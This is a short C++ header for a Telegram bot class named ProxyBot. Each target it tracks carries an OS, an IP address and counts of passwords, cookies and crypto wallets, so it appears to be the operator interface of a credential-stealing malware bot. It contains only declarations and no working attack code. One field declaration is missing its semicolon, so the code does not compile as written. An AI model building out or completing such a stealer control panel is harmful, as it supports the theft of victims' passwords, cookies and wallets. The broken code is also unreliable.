#include <exception>
#include <iostream>
#include <string>
#include <vector>
#include <unordered_map>
#include <tgbot/tgbot.h>

using namespace TgBot;

class ProxyBot {

public:
    ProxyBot();
    ~ProxyBot();
    void start();
    
private:
    struct Target {
        std::string os
        std::string ip;
        std::string passCount;
        std::string cookieCount;
        std::string cryptoCount;
    };
    struct User {
        User() = default;
        ~User() {
            for (auto& target : targets) {
                if (target.second != nullptr) {
                    delete target.second;
                    target.second = nullptr;
                }
            }
        }
        Target* currentTarget = nullptr;
        std::unordered_map<std::string, Target*>targets; //unique target id,pointer to target struct
    };
    std::string token{ std::getenv("proxyBotToken")}; //set env variable with your token 
    TgBot::Bot bot{ token };

    TgBot::InlineKeyboardMarkup::Ptr targetsMarkup;

    std::unordered_map<uint64_t, User*>users;
    std::vector<uint64_t>allowedId;

    std::vector<TgBot::InlineKeyboardButton::Ptr> targetsColumn;

    void parseAllowedList();
    void setCommands();
    void setEventFunc();
    void performTargetsColumn(const std::string& id);
};